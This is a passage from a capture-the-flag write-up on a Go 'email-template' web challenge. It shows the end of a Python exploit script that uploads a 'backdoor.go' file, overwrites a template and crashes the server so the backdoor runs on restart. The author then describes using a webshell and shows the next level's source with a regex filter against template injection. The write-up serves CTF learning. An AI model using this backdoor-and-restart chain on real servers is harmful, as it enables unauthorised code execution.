</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>files</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;fish&#39;</span><span class=p>:</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;backdoor.go&#34;</span><span class=p>,</span> <span class=s2>&#34;r&#34;</span><span class=p>)}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Updates the preview template.</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>URL</span><span class=o>+</span><span class=s2>&#34;/update&#34;</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Triggers the rendering of our template with the provided form file</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>URL</span><span class=o>+</span><span class=s2>&#34;/preview?&#34;</span><span class=p>,</span> <span class=n>files</span><span class=o>=</span><span class=n>files</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Crashes server, which restarts the service.</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>URL</span><span class=o>+</span><span class=s2>&#34;/update&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>This ended up working although I was not too confident. Right after the CTF, I realized I could have looked into the definition of the service. Later, another player confirmed that the file <code>/etc/systemd/system/email-template.service</code> showed all the necessary information to be confident in this attack. Next time, I will be more careful as that service&rsquo;s name was mentioned in the <code>reset.php</code> script and I should have taken a look.</p><pre aria-label="Box containing code sample." tabindex=0><code>[Unit]
Description=Email Template

[Service]
Type=simple
User=www-data
Group=www-data
Restart=always
RestartSec=5s
WorkingDirectory=/app/
ExecStart=/usr/local/go/bin/go run /app/main.go

[Install]
WantedBy=multi-user.target
</code></pre><p>With our webshell, it is only a matter of a few commands to get the flag.</p><p><strong>FLAG-527afbab4c2ae6ed15d6134328b8bc05</strong></p><h2 id=level-3---just-a-regular-bypass><a class=anchor href=#level-3---just-a-regular-bypass title='Anchor for: Level 3 - Just a Regular Bypass.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.cf28e91d9cb2e63d8266b2e4ffbbf274.svg#hashtag"/></svg></a>Level 3 - Just a Regular Bypass</h2><p>We now get access to a third website (<a href=http://dev-092f50226ea22197.email-template.ctf>http://dev-092f50226ea22197.email-template.ctf</a>). It is similar to the second one, but this time with some input filters. Code is provided again.</p><div class=highlight><div aria-label="Box containing code sample." tabindex=0 class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=hl><span class=lnt> 19
</span></span><span class=hl><span class=lnt> 20
</span></span><span class=hl><span class=lnt> 21
</span></span><span class=hl><span class=lnt> 22
</span></span><span class=hl><span class=lnt> 23
</span></span><span class=hl><span class=lnt> 24
</span></span><span class=hl><span class=lnt> 25
</span></span><span class=hl><span class=lnt> 26
</span></span><span class=hl><span class=lnt> 27
</span></span><span class=hl><span class=lnt> 28
</span></span><span class=hl><span class=lnt> 29
</span></span><span class=hl><span class=lnt> 30
</span></span><span class=hl><span class=lnt> 31
</span></span><span class=hl><span class=lnt> 32
</span></span><span class=hl><span class=lnt> 33
</span></span><span class=hl><span class=lnt> 34
</span></span><span class=hl><span class=lnt> 35
</span></span><span class=hl><span class=lnt> 36
</span></span><span class=hl><span class=lnt> 37
</span></span><span class=hl><span class=lnt> 38
</span></span><span class=hl><span class=lnt> 39
</span></span><span class=hl><span class=lnt> 40
</span></span><span class=hl><span class=lnt> 41
</span></span><span class=hl><span class=lnt> 42
</span></span><span class=hl><span class=lnt> 43
</span></span><span class=hl><span class=lnt> 44
</span></span><span class=hl><span class=lnt> 45
</span></span><span class=hl><span class=lnt> 46
</span></span><span class=hl><span class=lnt> 47
</span></span><span class=hl><span class=lnt> 48
</span></span><span class=hl><span class=lnt> 49
</span></span><span class=hl><span class=lnt> 50
</span></span><span class=hl><span class=lnt> 51
</span></span><span class=hl><span class=lnt> 52
</span></span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=hl><span class=lnt> 87
</span></span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=hl><span class=lnt>137
</span></span><span class=hl><span class=lnt>138
</span></span><span class=hl><span class=lnt>139
</span></span><span class=hl><span class=lnt>140
</span></span><span class=hl><span class=lnt>141
</span></span><span class=hl><span class=lnt>142
</span></span><span class=hl><span class=lnt>143
</span></span><span class=hl><span class=lnt>144
</span></span><span class=hl><span class=lnt>145
</span></span><span class=hl><span class=lnt>146
</span></span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=hl><span class=lnt>155
</span></span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=kn>package</span> <span class=nx>main</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;os&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;log&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;regexp&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;strings&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=s>&#34;net/http&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;io/ioutil&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=s>&#34;github.com/gin-gonic/gin&#34;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>type</span> <span class=nx>Update</span> <span class=kd>struct</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>Template</span> <span class=kt>string</span> <span class=s>`json:&#34;template&#34; binding:&#34;required&#34;`</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class="line hl"><span class=cl><span class=kd>func</span> <span class=nf>filter</span><span class=p>(</span><span class=nx>template</span> <span class=kt>string</span><span class=p>)</span> <span class=p>(</span><span class=kt>bool</span><span class=p>,</span> <span class=kt>string</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class="line hl"><span class=cl>    <span class=nx>r1</span><span class=p>,</span> <span class=nx>_</span> <span class=o>:=</span> <span class=nx>regexp</span><span class=p>.</span><span class=nf>Compile</span><span class=p>(</span><span class=s>`(?i)(\x7b\x7b[^\x7d]*([&#34;\x60\(\)=\|]|Request|Writer|Params|Handle)[^\x7d]*\x7d\x7d)`</span><span class=p>)</span>
</span></span><span class="line hl"><span class=cl>    <span class=nx>r2</span><span class=p>,</span> <span class=nx>_</span> <span class=o>:=</span> <span class=nx>regexp</span><span class=p>.</span><span class=nf>Compile</span><span class=p>(</span><span class=s>`(?i)(\x7b\x7b[^\x7d]*(\.title|\.eventname|\.firstname|\.lastname|\.companyname|\.custom[0-9]+)[^\x7d]*\x7d\x7d)`</span><span class=p>)</span>
</span></span><span class="line hl"><span class=cl>    <span class=nx>r3</span><span class=p>,</span> <span class=nx>_</span> <span class=o>:=</span> <span class=nx>regexp</span><span class=p>.</span><span class=nf>Compile</span><span class=p>(</span><span class=s>`(\x7b\x7b *(\.title|\.eventname|\.firstname|\.lastname|\.companyname|\.custom[0-9]+) *\x7d\x7d)`</span><span class=p>)</span>
</span></span><span class="line hl"><span class=cl>
</span></span><span class="line hl"><span class=cl>    <span class=c1>// Filter everything from Context, and double quotes, equal, backtick, pipe and parenthesis to avoid bypass as well.
</span></span></span><span class="line hl"><span class=cl><span class=c1></span>    <span class=nx>i</span> <span class=o>:=</span> <span class=nx>r1</span><span class=p>.</span><span class=nf>FindStringSubmatch</span><span class=p>(</span><span class=nx>template</span><span class=p>)</span>
</span></span><span class="line hl"><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=nx>i</span><span class=p>)</span> <span class=p>&gt;</span> <span class=mi>0</span>  <span class=p>{</span>
</span></span><span class="line hl"><span class=cl>        <span class=k>return</span> <span class=kc>false</span><span class=p>,</span> <span class=s>&#34;&#34;</span>
</span></span><span class="line hl"><span class=cl>    <span class=p>}</span>
</span></span><span class="line hl"><span class=cl>
</span></span><span class="line hl"><span class=cl>    <span class=c1>// Make sure the default variables can&#39;t be used to bypass filter.
</span></span></span><span class="line hl"><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=nx>strings</span><span class=p>.</span><span class=nf>Contains</span><span class=p>(</span><span class=nx>template</span><span class=p>,</span> <span class=s>&#34;.title&#34;</span><span class=p>)</span>  <span class=o>||</span>
</span></span><span class="line hl"><span class=cl>        <span class=nx>strings</span><span class=p>.</span><span class=nf>Contains</span><span class=p>(</span><span class=nx>template</span><span class=p>,</span> <span class=s>&#34;.eventname&#34;</span><span class=p>)</span> <span class=o>||</span>
</span></span><span class="line hl"><span class=cl>        <span class=nx>strings</span><span class=p>.</span><span class=nf>Contains</span><span class=p>(</span><span class=nx>template</span><span class=p>,</span> <span class=s>&#34;.firstname&#34;</span><span class=p>)</span> <span class=o>||</span>
</span></span><span class="line hl"><span class=cl>        <span class=nx>strings</span><span class=p>.</span><span class=nf>Contains</span><span class=p>(</span><span class=nx>template</span><span class=p>,</span> <span class=s>&#34;.lastname&#34;</span><span class=p>)</span> <span class=o>||</span>
</span></span><span class="line hl"><span class=cl>        <span class=nx>strings</span><span class=p>.</span><span class=nf>Contains</span><span class=p>(</span><span class=nx>template</span><span class=p>,</span> <span class=s>&#34;.companyname&#34;</span><span class=p>)</span> <span class=o>||</span>
</span></span><span class="line hl"><span class=cl>        <span class=nx>strings</span><span class=p>.</span><span class=nf>Contains</span><span class=p>(</span><span class=nx>template</span><span class=p>,</span> <span class=s>&#34;.custom&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class="line hl"><span class=cl>
</span></span><span class="line hl"><span class=cl>
</span></span><span class="line hl"><span class=cl>        <span class=nx>j</span> <span class=o>:=</span> <span class=nx>r2</span><span class=p>.</span><span class=nf>FindAllString</span><span class=p>(</span><span class=nx>template</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class="line hl"><span class=cl>        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=nx>j</span><span class=p>)</span> <span class=p>&gt;</span> <span class=mi>0</span>  <span class=p>{</span>
</span></span><span class="line hl"><span class=cl>            <span class=k>for</span> <span class=nx>_</span><span class=p>,</span> <span class=nx>v</span> <span class=o>:=</span> <span class=k>range</span> <span class=nx>j</span> <span class=p>{</span>
</span></span><span class="line hl"><span class=cl>                <span class=nx>k</span> <span class=o>:=</span> <span class=nx>r3</span><span class=p>.</span><span class=nf>FindStringSubmatch</span><span class=p>(</span><span class=nx>v</span><span class=p>)</span>
</span></span><span class="line hl"><span class=cl>                <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=nx>k</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>{</span>
</span></span><span class="line hl"><span class=cl>                    <span class=nx>l</span> <span class=o>:=</span> <span class=nx>r2</span><span class=p>.</span><span class=nf>FindStringSubmatch</span><span class=p>(</span><span class=nx>v</span><span class=p>)</span>
</span></span><span class="line hl"><span class=cl>                    <span class=k>return</span> <span class=kc>false</span><span class=p>,</span> <span class=s>&#34;Can only use &#34;</span> <span class=o>+</span> <span class=nx>l</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>+</span> <span class=s>&#34; like the following {{ &#34;</span> <span class=o>+</span> <span class=nx>l</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>+</span> <span class=s>&#34; }}&#34;</span>
</span></span><span class="line hl"><span class=cl>                <span class=p>}</span>
</span></span><span class="line hl"><span class=cl>            <span class=p>}</span>
</span></span><span class="line hl"><span class=cl>        <span class=p>}</span>
</span></span><span class="line hl"><span class=cl>    <span class=p>}</span>
</span></span><span class="line hl"><span class=cl>
</span></span><span class="line hl"><span class=cl>    <span class=k>return</span> <span class=kc>true</span><span class=p>,</span> <span class=s>&#34;&#34;</span>
</span></span><span class="line hl"><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>r</span> <span class=o>:=</span> <span class=nx>gin</span><span class=p>.</span><span class=nf>Default</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nx>r</span><span class=p>.</span><span class=nf>LoadHTMLGlob</span><span class=p>(</span><span class=s>&#34;templates/*&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nx>r</span><span class=p>.</span><span class=nf>Static</span><span class=p>(</span><span class=s>&#34;/assets&#34;</span><span class=p>,</span> <span class=s>&#34;./assets&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>r</span><span class=p>.</span><span class=nf>GET</span><span class=p>(</span><span class=s>&#34;/&#34;</span><span class=p>,</span> <span class=kd>func</span><span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>gin</span><span class=p>.</span><span class=nx>Context</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>f</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>os</span><span class=p>.</span><span class=nf>Open</span><span class=p>(</span><span class=s>&#34;templates/preview.html&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>defer</span> <span class=kd>func</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nx>err</span> <span class=p>=</span> <span class=nx>f</span><span class=p>.</span><span class=nf>Close</span><span class=p>();</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>content</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>ioutil</span><span class=p>.</span><span class=nf>ReadAll</span><span class=p>(</span><span class=nx>f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>c</span><span class=p>.</span><span class=nf>HTML</span><span class=p>(</span><span class=nx>http</span><span class=p>.</span><span class=nx>StatusOK</span><span class=p>,</span> <span class=s>&#34;index.html&#34;</span><span class=p>,</span> <span class=nx>gin</span><span class=p>.</span><span class=nx>H</span><span class=p>{</span><span class=s>&#34;title&#34;</span><span class=p>:</span><span class=s>&#34;Test!&#34;</span><span class=p>,</span><span class=s>&#34;template&#34;</span><span class=p>:</span><span class=nb>string</span><span class=p>(</span><span class=nx>content</span><span class=p>),</span><span class=s>&#34;c&#34;</span><span class=p>:</span><span class=nx>c</span><span class=p>})</span>
</span></span><span class=line><span class=cl>    <span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>r</span><span class=p>.</span><span class=nf>POST</span><span class=p>(</span><span class=s>&#34;/update&#34;</span><span class=p>,</span> <span class=kd>func</span><span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>gin</span><span class=p>.</span><span class=nx>Context</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>update</span> <span class=nx>Update</span>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>err</span> <span class=kt>error</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>err</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>BindJSON</span><span class=p>(</span><span class=o>&amp;</span><span class=nx>update</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class="line hl"><span class=cl>        <span class=k>if</span> <span class=nx>b</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nf>filter</span><span class=p>(</span><span class=nx>update</span><span class=p>.</span><span class=nx>Template</span><span class=p>);</span> <span class=p>!</span><span class=nx>b</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>c</span><span class=p>.</span><span class=nf>JSON</span><span class=p>(</span><span class=mi>400</span><span class=p>,</span> <span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>f</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>os</span><span class=p>.</span><span class=nf>OpenFile</span><span class=p>(</span><span class=s>&#34;templates/preview.html&#34;</span><span class=p>,</span> <span class=nx>os</span><span class=p>.</span><span class=nx>O_WRONLY</span><span class=p>|</span><span class=nx>os</span><span class=p>.</span><span class=nx>O_CREATE</span><span class=p>|</span><span class=nx>os</span><span class=p>.</span><span class=nx>O_TRUNC</span><span class=p>,</span> <span class=mo>0664</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>defer</span> <span class=nx>f</span><span class=p>.</span><span class=nf>Close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nx>_</span><span class=p>,</span> <span class=nx>err</span> <span class=p>=</span> <span class=nx>f</span><span class=p>.</span><span class=nf>WriteString</span><span class=p>(</span><span class=nx>update</span><span class=p>.</span><span class=nx>Template</span><span class=p>);</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=nx>c</span><span class=p>.</span><span class=nf>JSON</span><span class=p>(</span><span class=mi>200</span><span class=p>,</span> <span class=s>&#34;ok&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>r</span><span class=p>.</span><span class=nf>Any</span><span class=p>(</span><span class=s>&#34;/preview&#34;</span><span class=p>,</span> <span class=kd>func</span><span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>gin</span><span class=p>.</span><span class=nx>Context</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>title</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>title</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;title&#34;</span><span class=p>);</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;title&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>title</span> <span class=p>=</span> <span class=s>&#34;Test Email&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>eventname</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>eventname</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;eventname&#34;</span><span class=p>);</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;eventname&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>eventname</span> <span class=p>=</span> <span class=s>&#34;My-Event-Name&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>firstname</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>firstname</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;firstname&#34;</span><span class=p>);</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;firstname&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>firstname</span> <span class=p>=</span> <span class=s>&#34;John&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>lastname</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>lastname</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;lastname&#34;</span><span class=p>);</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;lastname&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>lastname</span> <span class=p>=</span> <span class=s>&#34;Smith&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>companyname</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>companyname</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;companyname&#34;</span><span class=p>);</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;companyname&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>companyname</span> <span class=p>=</span> <span class=s>&#34;Email Templating Inc.&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// Fetch all custom tags
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kd>var</span> <span class=nx>num</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>stop</span> <span class=kt>bool</span> <span class=p>=</span> <span class=kc>false</span>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>custom</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>customs</span> <span class=p>=</span> <span class=kd>map</span><span class=p>[</span><span class=kt>string</span><span class=p>]</span><span class=kt>string</span><span class=p>{}</span>
</span></span><span class="line hl"><span class=cl>        <span class=k>for</span> <span class=nx>i</span> <span class=o>:=</span> <span class=mi>1</span><span class=p>;</span> <span class=p>!</span><span class=nx>stop</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span> <span class=p>{</span>
</span></span><span class="line hl"><span class=cl>            <span class=nx>num</span> <span class=p>=</span> <span class=s>&#34;custom&#34;</span><span class=o>+</span><span class=nb>string</span><span class=p>(</span><span class=nx>i</span><span class=o>+</span><span class=mi>48</span><span class=p>)</span>
</span></span><span class="line hl"><span class=cl>            <span class=nx>custom</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=nx>num</span><span class=p>)</span>
</span></span><span class="line hl"><span class=cl>
</span></span><span class="line hl"><span class=cl>            <span class=k>if</span> <span class=nx>custom</span> <span class=o>==</span> <span class=s>&#34;&#34;</span><span class=p>{</span>
</span></span><span class="line hl"><span class=cl>                <span class=nx>stop</span> <span class=p>=</span> <span class=kc>true</span>
</span></span><span class="line hl"><span class=cl>                <span class=k>break</span>
</span></span><span class="line hl"><span class=cl>            <span class=p>}</span>
